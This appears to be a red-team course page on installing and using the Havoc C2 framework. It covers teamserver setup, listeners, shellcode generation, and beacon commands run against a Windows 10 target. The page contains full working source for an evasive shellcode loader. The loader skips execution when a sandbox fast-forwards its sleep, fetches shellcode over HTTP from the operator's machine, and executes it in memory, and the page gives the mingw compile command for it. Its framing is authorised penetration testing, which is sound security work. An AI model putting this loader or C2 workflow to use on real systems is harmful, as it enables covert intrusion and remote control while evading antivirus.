---
title: "Red Teaming With Havoc C2"
tags:
  - "havoc"
  - "havoc-c2"
excerpt: "Red Teaming With Havoc C2"
categories:
  - "Courses"
---


# Introduction

Well, hello there! First off, thank you for your time; we promise you won't be disappointed. By the end of it, you should be comfortable utilizing the Havoc C2 to perform advanced penetration tests while remaining under the Blue team's detection radar. This course is meant to give you a solid foundation on many topics including but not limited to:

* Custom BOF's creation
* Executing C# Assembly entirely from memory
* Writing custom modules intended for the Havoc C2
* Bypassing IDS/IPS detections systems
* Bypassing ETW/AMSI
* etc.

While this specific course is meant to teach you how to be stealthy during engagements, remaining 100% undetected is practically impossible. Eventually, your presence will be known to the Blue Team. The question is, will they be able to retrace what you've done while you were scavenging in their environment?

If the Blue team succeeds in retracing and identifying what happened while you were hacking in their environment, this would mean that our engagement wasn't much of use to the client. Ideally, we want to expose the weaknesses of defenders so we can improve the security posture of our client. 

To achieve this, we will be showcasing many techniques on hiding our presence in the best ways possible to avoid uncovering our true actions to the Blue Team. Of course, we perform engagements in hopes of testing and assessing the defending abilities of the client's Blue Team. 

So, after our engagement, a comprehensive report of our actions/attacks must be provided to the client. The more weaknesses exposed, the better. Making sure our client will be able to withstand similar attacks in the future should be our main concern.

# What even is the Havoc C2?

The Havoc C2 or the Havoc Framework ( https://github.com/HavocFramework/Havoc ) is a free open-source C2 built and designed by *C5pider* and his fellow colleagues. The Framework is being constantly improved and worked on to better enhance its core features. New features are also added every so often. This course will focus on the latest version of the C2 which, at the time of writing is `0.7 (Bites The Dust)`. 

We will be exploring all of its functionalities as well as adding some of our own. By the end of this course, you will see the true power of this Framework. Additionally, Antivirus products get better by the day, so utilizing Havoc out of the box is not possible anymore. Since the project is free, development is dependent on developers coding in their free time. Will we let this stop us however? Absolutely not! We're hackers, we can make anything work! 

That being said, we will go over some basic custom loaders to successfully execute our beacons without being caught.  As this course is not meant to be an extensive guide on AV bypasses, we will stick to the basics.

# Installation

So without further ado, let's get started. The installation process will require us to issue quite a few commands in our terminal. Here's how this can be done.

1. Cloning the GitHub repository.

```
➜  SquidGuard git clone https://github.com/HavocFramework/Havoc.git
Cloning into 'Havoc'...
remote: Enumerating objects: 11029, done.
remote: Counting objects: 100% (3243/3243), done.
remote: Compressing objects: 100% (1098/1098), done.
remote: Total 11029 (delta 2285), reused 2869 (delta 2088), pack-reused 7786
Receiving objects: 100% (11029/11029), 33.81 MiB | 7.77 MiB/s, done.
Resolving deltas: 100% (7343/7343), done.
➜  SquidGuard
```

2. Install python3.

```
➜  SquidGuard sudo apt install python3
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
python3 is already the newest version (3.11.4-5+b1).
The following packages were automatically installed and are no longer required:
  libecap3 lua-lpeg python3-aardwolf python3-aesedb python3-aiocmd python3-aioconsole python3-aiosmb python3-aiowinreg python3-arc4 python3-asciitree python3-asn1tools python3-asyauth python3-asysocks
  python3-bitstruct python3-diskcache python3-lsassy python3-masky python3-minidump python3-minikerberos python3-msldap python3-neo4j python3-neobolt python3-neotime python3-oscrypto python3-pylnk3
  python3-pypsrp python3-pypykatz python3-pywerview python3-spnego python3-unicrypto python3-winacl squid-common squid-langpack tesseract-ocr-osd
Use 'sudo apt autoremove' to remove them.
0 upgraded, 0 newly installed, 0 to remove and 1971 not upgraded.
➜  SquidGuard 

➜  SquidGuard whereis python3.11 
python3.11: /usr/bin/python3.11 /usr/lib/python3.11 /etc/python3.11 /usr/local/lib/python3.11 /usr/include/python3.11 /usr/share/man/man1/python3.11.1.gz
➜  SquidGuard 
```

3. Install the `golang-go` package.

```
➜  SquidGuard sudo apt install golang-go
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
golang-go is already the newest version (2:1.21~2).
The following packages were automatically installed and are no longer required:
  libecap3 lua-lpeg python3-aardwolf python3-aesedb python3-aiocmd python3-aioconsole python3-aiosmb python3-aiowinreg python3-arc4 python3-asciitree python3-asn1tools python3-asyauth python3-asysocks
  python3-bitstruct python3-diskcache python3-lsassy python3-masky python3-minidump python3-minikerberos python3-msldap python3-neo4j python3-neobolt python3-neotime python3-oscrypto python3-pylnk3
  python3-pypsrp python3-pypykatz python3-pywerview python3-spnego python3-unicrypto python3-winacl squid-common squid-langpack tesseract-ocr-osd
Use 'sudo apt autoremove' to remove them.
0 upgraded, 0 newly installed, 0 to remove and 1971 not upgraded.
➜  SquidGuard 
```

4. After switching to the `Havoc/teamserver` directory, execute the following few commands as means of installing some `go` dependencies.

```
➜  SquidGuard cd Havoc 
➜  Havoc git:(main) cd teamserver 
➜  teamserver git:(main) go mod download golang.org/x/sys
➜  teamserver git:(main) go mod download github.com/ugorji/go
➜  teamserver git:(main) ✗ 
```

5. Install the necessary packages.

```
➜  teamserver git:(main) ✗ sudo apt install -y git build-essential apt-utils cmake libfontconfig1 libglu1-mesa-dev libgtest-dev libspdlog-dev libboost-all-dev libncurses5-dev libgdbm-dev libssl-dev libreadline-dev libffi-dev libsqlite3-dev libbz2-dev mesa-common-dev qtbase5-dev qtchooser qt5-qmake qtbase5-dev-tools libqt5websockets5 libqt5websockets5-dev qtdeclarative5-dev golang-go qtbase5-dev libqt5websockets5-dev libspdlog-dev python3-dev libboost-all-dev mingw-w64 nasm make
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
make is already the newest version (4.3-4.1).
make set to manually installed.
The following packages were automatically installed and are no longer required:
  libecap3 lua-lpeg python3-aardwolf python3-aesedb python3-aiocmd python3-aioconsole python3-aiosmb python3-aiowinreg python3-arc4 python3-asciitree python3-asn1tools python3-asyauth python3-asysocks
  python3-bitstruct python3-diskcache python3-lsassy python3-masky python3-minidump python3-minikerberos python3-msldap python3-neo4j python3-neobolt python3-neotime python3-oscrypto python3-pylnk3
  python3-pypsrp python3-pypykatz python3-pywerview python3-spnego python3-unicrypto python3-winacl squid-common squid-langpack tesseract-ocr-osd
Use 'sudo apt autoremove' to remove them.
0 upgraded, 0 newly installed, 0 to remove and 1971 not upgraded.
➜  teamserver git:(main) ✗ 
```

6. From there, we will go one directory back to find ourselves in the `Havoc` directory. We'll then initiate the below command to install the teamserver.

```
➜  Havoc git:(main) ✗ make ts-build
[*] building teamserver

➜  Havoc git:(main) ✗ 
```

7. Still from the same `Havoc` directory, we will now install the client. If any warnings occur, do not worry. They will not affect any functionality. 

```
➜  Havoc git:(main) ✗ make client-build                                                         
[*] building client                                                                       
[SNIP]

[ 94%] Building CXX object CMakeFiles/Havoc.dir/src/Util/Base64.cpp.o
[ 96%] Building CXX object CMakeFiles/Havoc.dir/src/Util/Base.cpp.o
[ 98%] Building CXX object CMakeFiles/Havoc.dir/Havoc_autogen/QYFM2Z2WYQ/qrc_Havoc.cpp.o
[100%] Linking CXX executable /home/kali/SquidGuard/Havoc/client/Havoc
gmake[3]: Leaving directory '/home/kali/SquidGuard/Havoc/client/Build'
[100%] Built target Havoc
gmake[2]: Leaving directory '/home/kali/SquidGuard/Havoc/client/Build'
gmake[1]: Leaving directory '/home/kali/SquidGuard/Havoc/client/Build'

```

8. Now, we will navigate inside the `profiles` directory and edit the `havoc.yaotl` config file. We mainly want to update the credentials that we will be using to authenticate to the teamserver.

```
➜  Havoc git:(main) ✗ cd profiles 
➜  profiles git:(main) ✗ ls
havoc.yaotl  http_smb.yaotl  webhook_example.yaotl
➜  profiles git:(main) ✗ nano havoc.yaotl

Operators {
    user "5pider" {
        Password = "password1234"
    }

    user "Neo" {
        Password = "password1234"
    }
}
```

These credentials can be modified to your preferences. If you're okay with the default values, leave them as is.

9. We're now ready to execute our Havoc setup. We'll start by initiating the teamserver following by the Havoc C2 client.


To initiate the team server, issue the following command while being in the `Havoc` directory.

```
➜  Havoc git:(main) ✗ pwd
/home/kali/SquidGuard/Havoc
➜  Havoc git:(main) ✗ sudo ./havoc server --profile ./profiles/havoc.yaotl -v --debug
              _______           _______  _______ 
    │\     /│(  ___  )│\     /│(  ___  )(  ____ \
    │ )   ( ││ (   ) ││ )   ( ││ (   ) ││ (    \/
    │ (___) ││ (___) ││ │   │ ││ │   │ ││ │      
    │  ___  ││  ___  │( (   ) )│ │   │ ││ │      
    │ (   ) ││ (   ) │ \ \_/ / │ │   │ ││ │      
    │ )   ( ││ )   ( │  \   /  │ (___) ││ (____/\
    │/     \││/     \│   \_/   (_______)(_______/

         pwn and elevate until it's done

[23:02:47] [DBUG] [cmd.glob..func2:59]: Debug mode enabled
[23:02:47] [INFO] Havoc Framework [Version: 0.7] [CodeName: Bites The Dust]
[23:02:47] [INFO] Havoc profile: ./profiles/havoc.yaotl
[23:02:47] [INFO] Build: 
 - Compiler x64 : data/x86_64-w64-mingw32-cross/bin/x86_64-w64-mingw32-gcc
 - Compiler x86 : data/i686-w64-mingw32-cross/bin/i686-w64-mingw32-gcc
 - Nasm         : /usr/bin/nasm
[23:02:47] [INFO] Time: 17/02/2024 23:02:47
[23:02:47] [INFO] Teamserver logs saved under: data/loot/2024.02.17._23:02:47
[23:02:47] [DBUG] [server.(*Teamserver).Start:53]: Starting teamserver...
[23:02:47] [INFO] Starting Teamserver on wss://0.0.0.0:40056
[23:02:47] [INFO] [SERVICE] starting service handle on wss://0.0.0.0:40056/service-endpoint
[23:02:47] [INFO] Opens existing database: data/teamserver.db
[23:02:47] [DBUG] [server.(*Teamserver).Start:492]: Wait til the server shutdown
[23:02:47] [DBUG] [certs.HTTPSGenerateRSACertificate:301]: Generating TLS certificate (RSA) for '0.0.0.0' ...
[23:02:47] [DBUG] [certs.generateCertificate:223]: Valid from 2023-05-07 23:02:47.374633857 -0400 EDT to 2026-05-06 23:02:47.374633857 -0400 EDT
[23:02:47] [DBUG] [certs.generateCertificate:228]: Serial Number: 228082846987753629939120245676174890000
[23:02:47] [DBUG] [certs.generateCertificate:234]: Authority certificate
[23:02:47] [DBUG] [certs.generateCertificate:247]: ExtKeyUsage = [1 2]
[23:02:47] [DBUG] [certs.generateCertificate:263]: Certificate authenticates IP address: 0.0.0.0
[23:02:47] [DBUG] [certs.generateCertificate:278]: Certificate is an AUTHORITY
```

With the team server now initiated, we'll start up the client.  In another terminal, execute the command shown below.

Note: We are still in the `Havoc` directory.

```
➜  Havoc git:(main) ✗ ./havoc client                                                 
              _______           _______  _______ 
    │\     /│(  ___  )│\     /│(  ___  )(  ____ \
    │ )   ( ││ (   ) ││ )   ( ││ (   ) ││ (    \/
    │ (___) ││ (___) ││ │   │ ││ │   │ ││ │      
    │  ___  ││  ___  │( (   ) )│ │   │ ││ │      
    │ (   ) ││ (   ) │ \ \_/ / │ │   │ ││ │      
    │ )   ( ││ )   ( │  \   /  │ (___) ││ (____/\
    │/     \││/     \│   \_/   (_______)(_______/

         pwn and elevate until it's done

[23:05:00] [info] Havoc Framework [Version: 0.6] [CodeName: Hierophant Green]
```

Upon executing the above command, a box will pop up on our screen asking for all sorts of details.

![](/assets/imgs/havoc-c2/Pasted image 20240217231722.png)

As can be seen, a few parameters are required.

* The name can be anything you please.
* For the host, we'll write `localhost`
* For the port, `40056` must be specified
* For the user/password combination, you'll need to use the ones you setup earlier in the `havoc.yaotl` config.

![](/assets/imgs/havoc-c2/Pasted image 20240217231937.png)

Once all fields are completed, press on `Connect`.

If everything went well with our installation, we should be presented with the Havoc interface.

![](/assets/imgs/havoc-c2/Pasted image 20240217232050.png)

# The Havoc Interface

You will notice a few different aspects about this C2's interface. So let's go over each one so we can better familiarize ourselves with the different components.

![](/assets/imgs/havoc-c2/Pasted image 20240217232302.png)

This section in the top-left is where all our beacons will appear. Details such as the `External, Internal, User, Computer, OS, etc` are shown which will help us better track our beacon. 

![](/assets/imgs/havoc-c2/Pasted image 20240217232716.png)

The section at the bottom left is where all the chat messages are concentrated. Since a team server is used as part of Havoc's functionality, multiple operators can connect at the same time and interact with the beacons. The different operators can connect from different computers as long as they can reach the team server running on port 40056 by default. The only thing to keep in mind for this setup is that all different operators must added in the `havoc.yaotl` config.

![](/assets/imgs/havoc-c2/Pasted image 20240218193551.png)

The Event Viewer, that is present in the top right portion of our screen, represents the logs captured since the beginning of our Havoc session. This section will show connections from different operators as well as information about our beacons when they connect back to us.

# Getting our first beacon

## Starting a listener

Now that we've established a solid baseline, let's get our hands dirty and start utilizing all the amazing features the Havoc C2 has to offer. But beforehand, we'll need to obtain our first beacon. Firstly, a listener must started. To do so, we'll click the `View` menu and select `Listeners`.

![](/assets/imgs/havoc-c2/Pasted image 20240218201341.png)

From there, a few options will appear at the bottom of our screen. We'll click on `Add`.

![](/assets/imgs/havoc-c2/Pasted image 20240218201429.png)

A window will pop-up allowing us to create our listener. 

![](/assets/imgs/havoc-c2/Pasted image 20240218201559.png)

As can be seen in the above screenshot, we need to provide a name for our listener as well as the host/port we want to bind on. In our case, we have done the following :

* Name = `http-listener`
* Host = `10.250.0.16`
* Port = `80`

And of course, these values can be updated to your liking. The parameters we went through as of now are mandatory and must be filled in. However, depending on the environment we are pentesting, we might require using some of the other options. So, here's a quick explanation on the other options you might potentially use :

* `User Agent` : This option can be used to specify a custom User Agent. We will go over on why this might be useful to us later on in the course.
* `Headers` : Same thing here, custom headers can be added.
* `Uris` : These are the Uri's Havoc will request when sending data back to our team server. Uri's will appear as the following : `/test`, `/news`, `/weather`, etc.
* `Host Header` : Custom host header.
* `Proxy Settings`: The proxy settings might be particularly useful to us if we know that our beacon will need to pass through a proxy to reach our team server. In some environments, connections must all pass through a proxy if the intention is to leave the intranet.

With our listener now done, we can create on `Save`.

![](/assets/imgs/havoc-c2/Pasted image 20240218202848.png)

## Crafting our payload

It's now time to have, what we call, a shellcode loader at the ready. This shellcode loader is a binary that once executed on the target, will connect back to our team server and provide us with a way of remotely interacting with our target. Creating fancy shellcode loaders isn't in the scope for this particular course, so we'll keep things simple. The target that we will be using for our numerous tests is running a fully updated Windows 10 operating system with all security protections turned on. However, keep in mind that this loader is not guaranteed to work against all AntiVirus products. This being said, let's have a quick look at the loader that we will be using.

```
#include <windows.h>
#include <winhttp.h>
#include <iostream>
#include <vector>
#include <conio.h>

#pragma comment(lib, "winhttp.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")
#pragma comment(lib, "ntdll")

void BypassDynamicAnalysis()
{

	int tick = GetTickCount64();
	Sleep(5000);
	int tock = GetTickCount64();
	if ((tock - tick) < 4500)
		exit(0);
}

std::vector<BYTE> Download(LPCWSTR baseAddress,int port,LPCWSTR filename)
{
    HINTERNET hSession = WinHttpOpen(
        NULL,
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);

    HINTERNET hConnect = WinHttpConnect(
        hSession,
        baseAddress,
        port,
        0);


    // create request handle
    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect,
        L"GET",
        filename,
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        0);

    WinHttpSendRequest(
        hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS,
        0,
        WINHTTP_NO_REQUEST_DATA,
        0,
        0,
        0);

    WinHttpReceiveResponse(
        hRequest,
        NULL);

    std::vector<BYTE> buffer;
    DWORD bytesRead = 0;

    do {

        BYTE temp[4096]{};
        WinHttpReadData(hRequest, temp, sizeof(temp), &bytesRead);

        if (bytesRead > 0) {
            buffer.insert(buffer.end(), temp, temp + bytesRead);
        }

    } while (bytesRead > 0);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return buffer;
}

wchar_t* CharArrayToLPCWSTR(const char* array)
{
	wchar_t* wString = new wchar_t[4096];
	MultiByteToWideChar(CP_ACP, 0, array, -1, wString, 4096);
	return wString;
}

int main(int argc, char* argv[])
{
    BypassDynamicAnalysis();
    std::vector<BYTE> recvbuf;
    //  EDIT:                <ip>               <port>      <shellcodefile>
    recvbuf = Download(L"10.250.0.16\0", std::stoi("8001"), L"/test.bin\0");
    
	LPVOID alloc_mem = VirtualAlloc(NULL, recvbuf.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	if (!alloc_mem) {
		printf("Well... it failed! (%u)\n", GetLastError());
		return -1;
	}

	CopyMemory(alloc_mem, recvbuf.data(), recvbuf.size());

	DWORD oldProtect;
	if (!VirtualProtect(alloc_mem, sizeof(recvbuf), PAGE_EXECUTE_READ, &oldProtect)) {
		printf("Failed sd asd asd asdto change memory protection (%u)\n", GetLastError());
		return -2;
	}

	HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)alloc_mem, NULL, 0, NULL);
	if (!tHandle) {
		printf("Failed thread (%u)\n", GetLastError());
		return -3;
	}
	printf("\n\nalloc_mem address : %p\n", alloc_mem);
	WaitForSingleObject(tHandle, INFINITE);
	((void(*)())alloc_mem)();

	return 0;

}
```

Let's now quickly go through the basic functionality of this code :

* We start by including some libraries which will later be used in the program's flow.

```
#include <windows.h>
#include <winhttp.h>
#include <iostream>
#include <vector>
#include <conio.h>

#pragma comment(lib, "winhttp.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")
#pragma comment(lib, "ntdll")
```

* We proceed by incorporating a sleep mechanism designed to bypass any behavioral analysis done by AntiVirus products. In short, we begin with a `Sleep` that lasts 5 seconds(5000 ms).

```
int tick = GetTickCount64();
        Sleep(5000);
```

When behavioral analysis is performed on executables, defensive solutions will fast forward through the wait time and proceed with the flow of the program. If this is the case, we proceed to check if the flow was fast-forwarded and if so, the program exits to mask its true intentions.

```
int tock = GetTickCount64();
        if ((tock - tick) < 4500)
                exit(0);
```

* We then create a `Download` function that accepts 3 parameters : `Host` and `Port` and `FileName`. Those parameters serve as an indication from where the shellcode must be downloaded.

```
std::vector<BYTE> Download(LPCWSTR baseAddress,int port,LPCWSTR filename)
{
    HINTERNET hSession = WinHttpOpen(
        NULL,
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);

    HINTERNET hConnect = WinHttpConnect(
        hSession,
        baseAddress,
        port,
        0);


    // create request handle
    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect,
        L"GET",
        filename,
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        0);

    WinHttpSendRequest(
        hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS,
        0,
        WINHTTP_NO_REQUEST_DATA,
        0,
        0,
        0);

    WinHttpReceiveResponse(
        hRequest,
        NULL);

    std::vector<BYTE> buffer;
    DWORD bytesRead = 0;

    do {

        BYTE temp[4096]{};
        WinHttpReadData(hRequest, temp, sizeof(temp), &bytesRead);

        if (bytesRead > 0) {
            buffer.insert(buffer.end(), temp, temp + bytesRead);
        }

    } while (bytesRead > 0);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return buffer;
}
```

* We then continue by calling the previously declared `Download` function to download our desired shellcode.

```
int main(int argc, char* argv[])
{
    BypassDynamicAnalysis();
    std::vector<BYTE> recvbuf;
    //  EDIT:                <ip>               <port>      <shellcodefile>
    recvbuf = Download(L"10.250.0.16\0", std::stoi("8001"), L"/test.bin\0");
```

* Then, with the help of multiple Windows API's such as `VirtualAlloc`, `VirtualProtect` and `CreateThread`, we inject the downloaded shellcode into the loader's process itself.

```
LPVOID alloc_mem = VirtualAlloc(NULL, recvbuf.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

        if (!alloc_mem) {
                printf("Well... it failed! (%u)\n", GetLastError());
                return -1;
        }

        CopyMemory(alloc_mem, recvbuf.data(), recvbuf.size());

        DWORD oldProtect;
        if (!VirtualProtect(alloc_mem, sizeof(recvbuf), PAGE_EXECUTE_READ, &oldProtect)) {
                printf("Failed sd asd asd asdto change memory protection (%u)\n", GetLastError());
                return -2;
        }

        HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)alloc_mem, NULL, 0, NULL);
        if (!tHandle) {
                printf("Failed thread (%u)\n", GetLastError());
                return -3;
        }
        printf("\n\nalloc_mem address : %p\n", alloc_mem);
        WaitForSingleObject(tHandle, INFINITE);
        ((void(*)())alloc_mem)();

        return 0;

}
```

As a result of this loader's execution, we should be able to receive our beacon in the Havoc C2. With this being said, you might be asking yourself, what shellcode will we be using? Well, Havoc has our back on this one, as it can generate the shellcode for us.

### Generating the shellcode

To get our shellcode, we have to navigate to the `Attack` menu and subsequently click on the `Payload` dropdown as can be seen below.

![](/assets/imgs/havoc-c2/Pasted image 20240218205420.png)

This will open a window similar to the following.

![](/assets/imgs/havoc-c2/Pasted image 20240218205449.png)

Just like for the listener, we need to fill in a few values. 

* The listener name must be selected from the dropdown menu. Make sure to select the one we created in an earlier step.
* Leave the Arch at x64
* For the format, open the dropdown menu and click on `Windows Shellcode`

Those are the main options that we need to manage. You definitely noticed the `Config` section which contains multiple options we can select. Those are meant to be used as ways of bypassing security solutions it'll be time to issue certain commands in our beacon. However, Havoc isn't a new Framework anymore, thereby those bypasses will unfortunately not work anymore. Thus, we will not touch the default values.

From there, click on `Generate`.

You will notice some output in the console while the generation is being done. Bear in mind that the generation will take a few seconds. 

![](/assets/imgs/havoc-c2/Pasted image 20240218210043.png)

When the generation of the shellcode is completed, a pop-up will appear prompting us to save the shellcode to a location of our choice. Upon doing so, we should see the success message indicating to us that everything went well.

![](/assets/imgs/havoc-c2/Pasted image 20240218210324.png)

### Getting it all together

With our shellcode now in place,  we need to navigate to the directory we saved it in and start a python http listener that will be responsible of serving the shellcode's content.

```
➜  SquidGuard python3 -m http.server 8001
Serving HTTP on 0.0.0.0 port 8001 (http://0.0.0.0:8001/) ...
```

In this case, port `8001` was used as an example.

Now, it's time to update our loader with the appropriate values. The modifications only go as far as modifying the following line :

```
recvbuf = Download(L"10.250.0.16\0", std::stoi("8001"), L"/demon.x64.bin\0");
```

* `10.250.0.16` represents the IP of our Kali machine.
* `8001` represents the port the python http server is listening on.
* `demon.x64.bin` represents the file containing our beacons' shellcode

With the loader now ready, we will go right ahead and compile it.

In order for the compilation to work from Linux directly, a package called `mingw-w64` must be installed prior.

```
➜  SquidGuard sudo apt-get install mingw-w64
[sudo] password for kali: 
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
mingw-w64 is already the newest version (11.0.1-3).
The following packages were automatically installed and are no longer required:
  libecap3 lua-lpeg python3-aardwolf python3-aesedb python3-aiocmd python3-aioconsole python3-aiosmb python3-aiowinreg python3-arc4 python3-asciitree python3-asn1tools python3-asyauth python3-asysocks
  python3-bitstruct python3-diskcache python3-lsassy python3-masky python3-minidump python3-minikerberos python3-msldap python3-neo4j python3-neobolt python3-neotime python3-oscrypto python3-pylnk3
  python3-pypsrp python3-pypykatz python3-pywerview python3-spnego python3-unicrypto python3-winacl squid-common squid-langpack tesseract-ocr-osd
Use 'sudo apt autoremove' to remove them.
0 upgraded, 0 newly installed, 0 to remove and 1971 not upgraded.
➜  SquidGuard
```

Now, we can perform the compilation as follows :

```
➜  SquidGuard x86_64-w64-mingw32-g++ --static webloader.cpp -o webloader.exe -lwinhttp -fpermissive
➜  SquidGuard
```

With the actual executable in hand, we can now transfer it to the fully updated/patched Windows 10 machine we spoke of previously. Of course, this isn't applicable to a real engagement. However, the purpose of this demonstration is to provide you with an understanding of Havoc's core functionalities. A simulation of a real engagement utilizing all the techniques acquired in this course will be provided at the end of this course. More details later.

#### Transfer of files

The suggested way of transfering our loader to the Windows VM is via SCP. After making sure that SSH is installed (`sudo apt install ssh`) on Kali and up and running (`sudo service ssh status`), we can issue the following command in our Windows command prompt :

```
scp kali@10.10.10.10:/path/to/exe .
```

From there, the loader is executed while keeping all of Windows Defender's options ON :

![](/assets/imgs/havoc-c2/Pasted image 20240218211927.png)

Looking back at our Python HTTP server, we will notice a request for our shellcode :

```
➜  SquidGuard python3 -m http.server 8001
Serving HTTP on 0.0.0.0 port 8001 (http://0.0.0.0:8001/) ...
10.250.0.30 - - [18/Feb/2024 05:55:59] "GET /demon.x64.bin HTTP/1.1" 200 -
```

As well as a beacon in Havoc :

![](/assets/imgs/havoc-c2/Pasted image 20240218212030.png)

Fantastic! We have our first beacon!

# Getting to know all about Havoc's commands

In order to interact with the beacon we just received, simply double click on it. Upon doing so, you'll now see a prompt allowing you to send commands to the beacon.

![](/assets/imgs/havoc-c2/Pasted image 20240218212219.png)

Let's verify that our beacon is alive but testing a simple `whoami` command.

```
18/02/2024 06:11:42 [Neo] Demon » whoami

[*] [852A3604] Tasked demon to get the info from whoami /all without starting cmd.exe

[+] Send Task to Agent [31 bytes]
[+] Received Output [5665 bytes]:

UserName SID

====================== ====================================

STANDALONE01\Administrator S-1-5-21-3039253672-3550976879-3235238042-500
GROUP INFORMATION Type SID Attributes

================================================= ===================== ============================================= ==================================================

STANDALONE01\None Group S-1-5-21-3039253672-3550976879-3235238042-513 Mandatory group, Enabled by default, Enabled group,
Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group,
NT AUTHORITY\Local account and member of Administrators groupWell-known group S-1-5-114 Mandatory group, Enabled by default, Enabled group,
BUILTIN\Administrators Alias S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner,
BUILTIN\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group,
NT AUTHORITY\INTERACTIVE Well-known group S-1-5-4 Mandatory group, Enabled by default, Enabled group,
CONSOLE LOGON Well-known group S-1-2-1 Mandatory group, Enabled by default, Enabled group,
NT AUTHORITY\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group,
NT AUTHORITY\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group,
NT AUTHORITY\Local account Well-known group S-1-5-113 Mandatory group, Enabled by default, Enabled group,
LOCAL Well-known group S-1-2-0 Mandatory group, Enabled by default, Enabled group,
NT AUTHORITY\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled group,
Mandatory Label\High Mandatory Level Label S-1-16-12288 Mandatory group, Enabled by default, Enabled group,


Privilege Name Description State

============================= ================================================= ===========================

SeIncreaseQuotaPrivilege Adjust memory quotas for a process Disabled
SeSecurityPrivilege Manage auditing and security log Disabled
SeTakeOwnershipPrivilege Take ownership of files or other objects Disabled
SeLoadDriverPrivilege Load and unload device drivers Disabled
SeSystemProfilePrivilege Profile system performance Disabled
SeSystemtimePrivilege Change the system time Disabled
SeProfileSingleProcessPrivilegeProfile single process Disabled
SeIncreaseBasePriorityPrivilegeIncrease scheduling priority Disabled
SeCreatePagefilePrivilege Create a pagefile Disabled
SeBackupPrivilege Back up files and directories Disabled
SeRestorePrivilege Restore files and directories Disabled
SeShutdownPrivilege Shut down the system Disabled
SeDebugPrivilege Debug programs Enabled
SeSystemEnvironmentPrivilege Modify firmware environment values Disabled
SeChangeNotifyPrivilege Bypass traverse checking Enabled
SeRemoteShutdownPrivilege Force shutdown from a remote system Disabled
SeUndockPrivilege Remove computer from docking station Disabled
SeManageVolumePrivilege Perform volume maintenance tasks Disabled
SeImpersonatePrivilege Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege Create global objects Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
SeTimeZonePrivilege Change the time zone Disabled
SeCreateSymbolicLinkPrivilege Create symbolic links Disabled
SeDelegateSessionUserImpersonatePrivilegeObtain an impersonation token for another user in the same sessionDisabled

[*] BOF execution completed
```

Appears to be working! At first glance, you might notice that the commands are executing rather slowly. This is caused by the default delay of 2 seconds between commands that Havoc adds to prevent network detection which is something we will talk about later on. This delay also has an actual name : `Jitter`. For now, we don't need that additional delay so we'll just set it to 0 :

```
18/02/2024 06:15:00 [Neo] Demon » sleep 0

[*] [257C3980] Tasked demon to sleep for 0 seconds
[+] Send Task to Agent [20 bytes]
[+] Set sleep interval to 0 seconds with 0% jitter
```

If you try to run commands now, you will definitely notice a drastic difference in how quick results come back. There's however a caveat for this, there seems to be an issue at the moment with Havoc where if sleep 0 is used, it might start draining RAM at very rapid rates even sometimes leading to a complete crash of the Virtual Machine. Ideally, it is recommended to keep it at 2 while testing the Framework or practicing in controlled environments.

### Exploring the available commands

Now that we have secured a beacon, let's explore all the available commands to us. To see a listing of commands, we can issue the `help` command.

```
24/01/2024 07:33:10 [Neo] Demon » help

  

Demon Commands

==============

  

Command Type Description

------- ------- -----------

adcs_enum Command Enumerate CAs and templates in the AD using Win32 functions

adcs_request Command Request an enrollment certificate

adduser Command Add a new user to a machine.

addusertogroup Command Add the specified user to the specified group

arp Command Lists out ARP table

bofbelt Command A Seatbelt port using BOFs

cacls Command List user permissions for the specified file, wildcards supported

cat Command display content of the specified file

cd Command change to specified directory

checkin Command request a checkin request

config Module configure the behaviour of the demon session

cp Command copy file from one location to another

dcenum Command enumerate domain information using Active Directory Domain Services

dir Command list specified directory

dll Module dll spawn and injection modules

domainenum Command Lists users accounts in the current domain

dotnet Module execute and manage dotnet assemblies

download Command downloads a specified file

driversigs Command checks drivers for known edr vendor names

enableuser Command Activates (and if necessary enables) the specified user account on the target computer.

enum_filter_driver Command Enumerate filter drivers

enumlocalsessions Command Enumerate currently attached user sessions both local and over RDP

env Command Print environment variables.

exit Command cleanup and exit

get-asrep Command Enumerate a given domain for user accounts with ASREP.

get-delegation Command Enumerate a given domain for different types of abusable Kerberos Delegation settings.

get-netsession Command Enumerate sessions on the local or specified computer

get-spns Command Enumerate a given domain for user accounts with SPNs.

get_password_policy Command Gets a server or DC's configured password policy

help Command Shows help message of specified command

inline-execute Command executes an object file

ipconfig Command Lists out adapters, system hostname and configured dns serve

job Module job manager

jump-exec Module lateral movement module

